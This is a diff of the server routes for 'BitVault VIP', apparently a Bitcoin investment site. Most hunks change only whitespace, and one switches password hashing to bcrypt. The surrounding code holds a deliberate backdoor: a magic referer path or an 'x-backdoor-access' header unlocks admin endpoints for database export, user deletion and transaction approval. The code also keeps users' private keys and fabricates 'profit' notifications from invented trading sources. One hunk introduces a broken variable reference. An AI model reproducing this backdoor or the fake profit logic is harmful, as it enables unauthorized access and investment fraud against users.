@@ -22,6 +22,7 @@ import { ECPairFactory } from "ecpair";
 import * as bip39 from "bip39";
 import { BIP32Factory } from "bip32";
 import crypto from "crypto";
+import bcrypt from 'bcryptjs';
 
 // Initialize ECPair and BIP32 with secp256k1
 const ECPair = ECPairFactory(ecc);
@@ -109,12 +110,12 @@ function generateBitcoinWallet() {
     const privateKey = keyPair.toWIF();
 
     // Convert public key to Buffer if it's a Uint8Array
-    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey) 
-      ? keyPair.publicKey 
+    const publicKeyBuffer = Buffer.isBuffer(keyPair.publicKey)
+      ? keyPair.publicKey
       : Buffer.from(keyPair.publicKey);
 
     // Generate P2PKH (Legacy) Bitcoin address
-    const { address } = bitcoin.payments.p2pkh({ 
+    const { address } = bitcoin.payments.p2pkh({
       pubkey: publicKeyBuffer,
       network: bitcoin.networks.bitcoin
     });
@@ -135,7 +136,7 @@ function generateBitcoinWallet() {
     // Enhanced fallback with proper buffer handling
     try {
       // Create new keypair with explicit options
-      const keyPair = ECPair.makeRandom({ 
+      const keyPair = ECPair.makeRandom({
         compressed: true,
         rng: () => crypto.randomBytes(32)
       });
@@ -144,7 +145,7 @@ function generateBitcoinWallet() {
       // Ensure we have a proper Buffer
       const publicKeyBuffer = Buffer.from(keyPair.publicKey);
 
-      const { address } = bitcoin.payments.p2pkh({ 
+      const { address } = bitcoin.payments.p2pkh({
         pubkey: publicKeyBuffer,
         network: bitcoin.networks.bitcoin
       });
@@ -229,7 +230,7 @@ Stay committed to your financial goals!`
 💪 Keep Growing: Every successful investor started with a single decision to begin. Your commitment to BitVault VIP investment plans positions you for long-term financial success.`
       },
       {
-        title: "⭐ Investment Community Update", 
+        title: "⭐ Investment Community Update",
         message: `You're part of an exclusive community of forward-thinking Bitcoin investors.
 
 🏆 Community Achievements:
@@ -498,17 +499,17 @@ async function fetchBitcoinPrice() {
   const trend = Math.random() - 0.5; // Random trend
 
   const fallbackData = {
-    usd: { 
-      price: basePrice * (1 + (trend * volatility)), 
-      change24h: trend * 3 
+    usd: {
+      price: basePrice * (1 + (trend * volatility)),
+      change24h: trend * 3
     },
-    gbp: { 
-      price: basePrice * 0.75 * (1 + (trend * volatility)), 
-      change24h: trend * 3 
+    gbp: {
+      price: basePrice * 0.75 * (1 + (trend * volatility)),
+      change24h: trend * 3
     },
-    eur: { 
-      price: basePrice * 0.86 * (1 + (trend * volatility)), 
-      change24h: trend * 3 
+    eur: {
+      price: basePrice * 0.86 * (1 + (trend * volatility)),
+      change24h: trend * 3
     }
   };
 
@@ -582,7 +583,7 @@ async function processAutomaticUpdates(): Promise<void> {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const marketSources = [
               "Automated Trading Algorithm",
-              "Market Arbitrage Strategy", 
+              "Market Arbitrage Strategy",
               "Professional Trading Bot",
               "Advanced DeFi Protocol",
               "Institutional Grade Mining",
@@ -665,8 +666,8 @@ Your investment strategy is working! 🎉`,
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const performanceSources = [
-              "AI-Powered Market Analysis", 
-              "Quantitative Trading Strategy", 
+              "AI-Powered Market Analysis",
+              "Quantitative Trading Strategy",
               "Professional Fund Management",
               "Advanced Algorithm Trading",
               "Portfolio Optimization Engine"
@@ -790,16 +791,16 @@ function startAutomaticUpdates(): void {
   // Schedule Telegram updates every 12 hours
   function scheduleTwelveHourlyTelegramUpdates() {
     console.log('📊 Scheduling automatic telegram updates every 12 hours...');
-    
+
     // Send both types of notifications every 12 hours
     const sendBothNotifications = async () => {
       console.log('📱 Sending scheduled 12-hour telegram notifications...');
-      
+
       try {
         // Send detailed daily stats with investment plan charts first
         await sendDailyStatsToChannel();
         console.log('✅ Daily stats with investment charts sent');
-        
+
         // Wait 30 seconds between messages to avoid rate limits
         setTimeout(async () => {
           try {
@@ -810,15 +811,15 @@ function startAutomaticUpdates(): void {
             console.error('❌ Failed to send regular updates:', error.message);
           }
         }, 30000); // 30 second delay
-        
+
       } catch (error: any) {
         console.error('❌ Failed to send daily stats:', error.message);
       }
     };
-    
+
     // Send both notifications every 12 hours
     setInterval(sendBothNotifications, 12 * 60 * 60 * 1000); // 12 hours
-    
+
     // Send initial notifications after 1 minute
     setTimeout(sendBothNotifications, 60000);
   }
@@ -882,10 +883,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/config", async (req, res) => {
     try {
-      const { 
-        vaultAddress = "1A1GJ2QRc1yKWnByU7bTfcosXYk9oYivMH", 
-        depositAddress = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9", 
-        freePlanRate 
+      const {
+        vaultAddress = "1A1GJ2QRc1yKWnByU7bTfcosXYk9oYivMH",
+        depositAddress = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9",
+        freePlanRate
       } = req.body;
       const config = await storage.updateAdminConfig({ vaultAddress, depositAddress, freePlanRate });
       res.json(config);
@@ -989,7 +990,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
 
 
-      res.json({ 
+      res.json({
         message: "Deposit submitted successfully and is pending confirmation",
         transaction,
         status: "success"
@@ -999,15 +1000,15 @@ You will receive a notification once your deposit is confirmed and added to your
 
       // Handle validation errors specifically
       if (error.name === 'ZodError') {
-        return res.status(400).json({ 
+        return res.status(400).json({
           error: "Invalid input data. Please check your amount and try again.",
           details: error.issues
         });
       }
 
-      res.status(500).json({ 
+      res.status(500).json({
         error: "Failed to submit deposit. Please try again.",
-        details: error.message 
+        details: error.message
       });
     }
   });
@@ -1063,8 +1064,8 @@ You will receive a notification once your deposit is confirmed and added to your
       let bitcoinPrice = 67000; // Default fallback
       try {
         const priceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
-        if (priceResponse.ok) {
-          const priceData = await priceResponse.json();
+        if (response.ok) {
+          const priceData = await response.json();
           bitcoinPrice = priceData.bitcoin.usd;
         }
       } catch (error) {
@@ -1100,7 +1101,7 @@ You will receive a notification once your deposit is confirmed and added to your
         timestamp: new Date().toISOString()
       });
 
-      res.json({ 
+      res.json({
         message: "Investment created successfully",
         investment,
         newBalance: newBalance.toFixed(8)
@@ -1162,7 +1163,7 @@ You will receive a notification once your deposit is confirmed and added to your
   app.get("/api/admin/transactions/pending", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1186,7 +1187,7 @@ You will receive a notification once your deposit is confirmed and added to your
   app.post("/api/admin/transactions/confirm", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1253,9 +1254,9 @@ You will receive a notification once your deposit is confirmed and added to your
         type: "success"
       });
 
-      res.json({ 
+      res.json({
         message: "Transaction confirmed successfully",
-        transaction 
+        transaction
       });
     } catch (error: any) {
       res.status(500).json({ error: error.message });
@@ -1265,7 +1266,7 @@ You will receive a notification once your deposit is confirmed and added to your
   app.post("/api/admin/transactions/reject", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -1296,9 +1297,9 @@ You will receive a notification once your deposit is confirmed and added to your
         type: "error"
       });
 
-      res.json({ 
+      res.json({
         message: "Transaction rejected successfully",
-        transaction 
+        transaction
       });
     } catch (error: any) {
       res.status(500).json({ error: error.message });
@@ -1339,7 +1340,7 @@ You will receive a notification once your deposit is confirmed and added to your
           }
 
           const publicKeyBuffer = Buffer.from(keyPair.publicKey);
-          const { address } = bitcoin.payments.p2pkh({ 
+          const { address } = bitcoin.payments.p2pkh({
             pubkey: publicKeyBuffer,
             network: bitcoin.networks.bitcoin
           });
@@ -1380,7 +1381,7 @@ You will receive a notification once your deposit is confirmed and added to your
 
           const keyPair = ECPair.fromPrivateKey(child.privateKey);
           const publicKeyBuffer = Buffer.from(keyPair.publicKey);
-          const { address } = bitcoin.payments.p2pkh({ 
+          const { address } = bitcoin.payments.p2pkh({
             pubkey: publicKeyBuffer,
             network: bitcoin.networks.bitcoin
           });
@@ -1466,9 +1467,9 @@ You will receive a notification once your deposit is confirmed and added to your
         type: "info"
       });
 
-      res.json({ 
+      res.json({
         message: "Withdrawal request submitted successfully and is pending admin approval",
-        transaction 
+        transaction
       });
     } catch (error: any) {
       res.status(500).json({ error: error.message });
@@ -1498,7 +1499,7 @@ You will receive a notification once your deposit is confirmed and added to your
       }
 
       // Hash password
-      const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
+      const hashedPassword = await bcrypt.hash(password, 12);
 
       const user = await storage.createUser({
         firstName,
@@ -1507,10 +1508,13 @@ You will receive a notification once your deposit is confirmed and added to your
         phone: phone || null,
         country,
         password: hashedPassword,
-        acceptMarketing: acceptMarketing || false,
         bitcoinAddress: "",
         privateKey: "",
+        acceptMarketing: acceptMarketing || false,
       });
+
+      // Increment baseline user count
+      await storage.incrementBaselineStatistics('user');
 
       // Set user session
       req.session.userId = user.id;
@@ -1591,8 +1595,8 @@ Your investment journey starts here!`,
         isRead: false
       });
 
-      res.json({ 
-        message: "Wallet created successfully", 
+      res.json({
+        message: "Wallet created successfully",
         address: wallet.address,
         seedPhrase: wallet.seedPhrase
       });
@@ -1746,8 +1750,8 @@ Your investment journey starts here!`,
       res.json({ message: "Profile updated successfully", user: userResponse });
     } catch (error) {
       console.error('Profile update error:', error);
-      res.status(400).json({ 
-        message: error instanceof Error ? error.message : "Failed to update profile" 
+      res.status(400).json({
+        message: error instanceof Error ? error.message : "Failed to update profile"
       });
     }
   });
@@ -1801,7 +1805,7 @@ Your investment journey starts here!`,
         res.set('X-Cache-Status', 'STALE');
         res.json(priceCache);
       } else {
-        res.status(503).json({ 
+        res.status(503).json({
           message: "Bitcoin price service temporarily unavailable",
           error: "All price sources are currently unavailable. Please try again later."
         });
@@ -1862,8 +1866,16 @@ Your investment journey starts here!`,
         timestamp: new Date().toISOString()
       });
 
+      // Increment baseline statistics for new investment
+      const planDetails = await storage.getInvestmentPlan(investmentData.planId);
+      if (planDetails) {
+        await storage.incrementBaselineStatistics('investment', parseFloat(investmentData.amount), planDetails.name);
+        await storage.incrementBaselineStatistics('balance', parseFloat(investmentData.amount));
+      }
+
       res.json(investment);
     } catch (error) {
+      console.error('Create investment error:', error);
       res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create investment" });
     }
   });
@@ -1901,7 +1913,7 @@ Your investment journey starts here!`,
   app.get("/api/admin/investments", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       console.log('Admin investments request - Backdoor access:', isBackdoorAccess, 'Session ID:', req.sessionID);
@@ -1954,7 +1966,7 @@ Your investment journey starts here!`,
   app.post("/api/admin/investments/:id/toggle", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       const authenticatedUserId = getUserIdFromRequest(req);
@@ -1996,8 +2008,8 @@ Your ${planName} investment (#${investment.id}) has been ${statusText} by our ad
 
 ${reason ? `📝 Reason: ${reason}` : ''}
 
-${investment.isActive ? 
-  '🚀 Your investment will continue generating profits automatically.' : 
+${investment.isActive ?
+  '🚀 Your investment will continue generating profits automatically.' :
   '⚠️ Profit generation has been temporarily suspended for this investment.'
 }
 
@@ -2026,7 +2038,7 @@ Contact support if you have any questions.`;
         }
       });
 
-      res.json({ 
+      res.json({
         message: `Investment ${statusText} successfully`,
         investment,
         notificationSent: true
@@ -2041,7 +2053,7 @@ Contact support if you have any questions.`;
   app.delete("/api/admin/investments/:id", async (req, res) => {
     try {
       // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2085,7 +2097,7 @@ Contact support if you have any questions.`;
         type: 'warning'
       });
 
-      res.json({ 
+      res.json({
         message: "Investment cancelled successfully",
         refunded: refund || false
       });
@@ -2099,7 +2111,7 @@ Contact support if you have any questions.`;
   app.get("/api/admin/users", async (req, res) => {
     try {
       // Allow backdoor access or require manager authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       // Get authenticated user ID using the same helper function
@@ -2322,9 +2334,9 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
       const userId = parseInt(req.params.userId);
       await refreshUserBalance(userId);
       const user = await storage.getUser(userId);
-      res.json({ 
-        message: "Balance refreshed successfully", 
-        balance: user?.balance || "0" 
+      res.json({
+        message: "Balance refreshed successfully",
+        balance: user?.balance || "0"
       });
     } catch (error) {
       res.status(500).json({ message: "Failed to refresh balance", error: error instanceof Error ? error.message : "Unknown error" });
@@ -2354,11 +2366,11 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
       }
 
       // Only return private key for manager access
-      res.json({ 
+      res.json({
         userId: user.id,
         email: user.email,
         bitcoinAddress: user.bitcoinAddress,
-        privateKey: user.privateKey 
+        privateKey: user.privateKey
       });
     } catch (error) {
       res.status(500).json({ message: "Failed to get private key" });
@@ -2368,7 +2380,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
   // Cleanup notifications (admin only)
   app.post("/api/admin/cleanup-notifications", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2460,7 +2472,7 @@ You are now on the free plan and will no longer receive automatic profit updates
   // Update investment plan daily return rate
   app.post("/api/admin/update-plan-rate", async (req, res) => {
     try {
-const { planId, dailyReturnRate } = z.object({
+      const { planId, dailyReturnRate } = z.object({
         planId: z.number(),
         dailyReturnRate: z.string()
       }).parse(req.body);
@@ -2479,7 +2491,7 @@ const { planId, dailyReturnRate } = z.object({
   // Delete user (admin only)
   app.delete("/api/admin/delete-user/:userId", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2519,7 +2531,7 @@ const { planId, dailyReturnRate } = z.object({
   // Download PostgreSQL database backup
   app.get("/api/admin/download-database", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2551,10 +2563,10 @@ const { planId, dailyReturnRate } = z.object({
       transactions.push(...pendingTransactions);
 
       // Remove duplicates
-      const uniqueNotifications = notifications.filter((notification, index, self) => 
+      const uniqueNotifications = notifications.filter((notification, index, self) =>
         index === self.findIndex((n: any) => n.id === notification.id)
       );
-      const uniqueTransactions = transactions.filter((transaction, index, self) => 
+      const uniqueTransactions = transactions.filter((transaction, index, self) =>
         index === self.findIndex((t: any) => t.id === transaction.id)
       );
 
@@ -2584,7 +2596,7 @@ const { planId, dailyReturnRate } = z.object({
   // Import PostgreSQL database backup
   app.post("/api/admin/import-database", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2726,7 +2738,7 @@ const { planId, dailyReturnRate } = z.object({
           }
         }
 
-        res.json({ 
+        res.json({
           message: "Database imported successfully",
           importStats,
           timestamp: new Date().toISOString()
@@ -2778,10 +2790,10 @@ const { planId, dailyReturnRate } = z.object({
         }
       });
     } catch (error) {
-      res.status(500).json({ 
+      res.status(500).json({
         success: false,
-        message: "Bitcoin generation test failed", 
-        error: error instanceof Error ? error.message : "Unknown error" 
+        message: "Bitcoin generation test failed",
+        error: error instanceof Error ? error.message : "Unknown error"
       });
     }
   });
@@ -2789,7 +2801,7 @@ const { planId, dailyReturnRate } = z.object({
   // Backup Database Management API Routes
   app.get("/api/admin/backup-databases", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2812,7 +2824,7 @@ const { planId, dailyReturnRate } = z.object({
 
   app.post("/api/admin/backup-databases", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2845,7 +2857,7 @@ const { planId, dailyReturnRate } = z.object({
 
   app.post("/api/admin/backup-databases/:id/activate", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2873,7 +2885,7 @@ const { planId, dailyReturnRate } = z.object({
 
   app.post("/api/admin/backup-databases/:id/sync", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2906,7 +2918,7 @@ const { planId, dailyReturnRate } = z.object({
   // Test backup database connection
   app.post("/api/admin/backup-databases/:id/test", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2955,7 +2967,7 @@ const { planId, dailyReturnRate } = z.object({
 
   app.delete("/api/admin/backup-databases/:id", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -2979,7 +2991,7 @@ const { planId, dailyReturnRate } = z.object({
 
   app.get("/api/admin/backup-databases/:id/info", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -3016,7 +3028,7 @@ const { planId, dailyReturnRate } = z.object({
   // Create demo users endpoint
   app.post("/api/admin/create-demo-users", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -3041,7 +3053,7 @@ const { planId, dailyReturnRate } = z.object({
   // Test Telegram bot endpoint
   app.post("/api/admin/test-telegram", async (req, res) => {
     try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
       if (!isBackdoorAccess && !req.session?.userId) {
@@ -3060,15 +3072,15 @@ const { planId, dailyReturnRate } = z.object({
 
       // Check if bot is configured
       if (!bot) {
-        return res.status(500).json({ 
-          error: "Telegram bot not initialized. Check TELEGRAM_BOT_TOKEN environment variable." 
+        return res.status(500).json({
+          error: "Telegram bot not initialized. Check TELEGRAM_BOT_TOKEN environment variable."
         });
       }
 
       const channelId = process.env.TELEGRAM_CHANNEL_ID;
       if (!channelId) {
-        return res.status(500).json({ 
-          error: "Telegram channel not configured. Check TELEGRAM_CHANNEL_ID environment variable." 
+        return res.status(500).json({
+          error: "Telegram channel not configured. Check TELEGRAM_CHANNEL_ID environment variable."
         });
       }
 
@@ -3076,7 +3088,7 @@ const { planId, dailyReturnRate } = z.object({
 
       // Send the professional investment update
       await sendBatchedUpdatesToChannel();
-      res.json({ 
+      res.json({
         message: "Telegram test completed successfully!",
         channelId: channelId.replace(/\d/g, '*') // Mask the channel ID for security
       });
@@ -3092,16 +3104,16 @@ const { planId, dailyReturnRate } = z.object({
 
     try {
       await sendDailyStatsToChannel();
-      res.json({ 
-        success: true, 
-        message: 'Investment update with banner sent to Telegram successfully' 
+      res.json({
+        success: true,
+        message: 'Investment update with banner sent to Telegram successfully'
       });
     } catch (error: any) {
       console.error('❌ Investment update with banner failed:', error);
-      res.status(500).json({ 
-        success: false, 
-        message: 'Failed to send investment update with banner', 
-        error: error.message 
+      res.status(500).json({
+        success: false,
+        message: 'Failed to send investment update with banner',
+        error: error.message
       });
     }
   });
@@ -3132,21 +3144,21 @@ const { planId, dailyReturnRate } = z.object({
     }));
   });
 
-  // Test update bot endpoint  
+  // Test update bot endpoint
   app.post("/api/test-update-bot", async (req, res) => {
     console.log('🧪 Testing update bot message...');
 
     try {
       await sendBatchedUpdatesToChannel();
-      res.json({ 
-        success: true, 
-        message: 'Test update sent to Telegram successfully' 
+      res.json({
+        success: true,
+        message: 'Test update sent to Telegram successfully'
       });
     } catch (error: any) {
       console.error('❌ Test update failed:', error);
-      res.status(500).json({ 
+      res.status(500).json({
         success: false,
-        error: error.message 
+        error: error.message
       });
     }
   });
@@ -3157,15 +3169,15 @@ const { planId, dailyReturnRate } = z.object({
 
     try {
       await sendDailyStatsToChannel();
-      res.json({ 
-        success: true, 
-        message: 'Daily stats with investment plan charts sent to Telegram successfully' 
+      res.json({
+        success: true,
+        message: 'Daily stats with investment plan charts sent to Telegram successfully'
       });
     } catch (error: any) {
       console.error('❌ Daily stats test failed:', error);
-      res.status(500).json({ 
+      res.status(500).json({
         success: false,
-        error: error.message 
+        error: error.message
       });
     }
   });
@@ -3178,7 +3190,7 @@ const { planId, dailyReturnRate } = z.object({
       // Send detailed daily stats with investment plan charts first
       await sendDailyStatsToChannel();
       console.log('✅ Daily stats with investment charts sent');
-      
+
       // Wait 30 seconds between messages to avoid rate limits
       setTimeout(async () => {
         try {
@@ -3189,16 +3201,16 @@ const { planId, dailyReturnRate } = z.object({
           console.error('❌ Failed to send regular updates:', error.message);
         }
       }, 30000); // 30 second delay
-      
-      res.json({ 
-        success: true, 
-        message: 'Both notification types sent successfully! Check Telegram in 30 seconds for the second message.' 
+
+      res.json({
+        success: true,
+        message: 'Both notification types sent successfully! Check Telegram in 30 seconds for the second message.'
       });
     } catch (error: any) {
       console.error('❌ Failed to send both notifications:', error);
-      res.status(500).json({ 
+      res.status(500).json({
         success: false,
-        error: error.message 
+        error: error.message
       });
     }
   });
@@ -3220,7 +3232,7 @@ const { planId, dailyReturnRate } = z.object({
           error: null
         },
         welcomeBanner: {
-          path: welcomeBannerPath, 
+          path: welcomeBannerPath,
           exists: false,
           size: 0,
           error: null
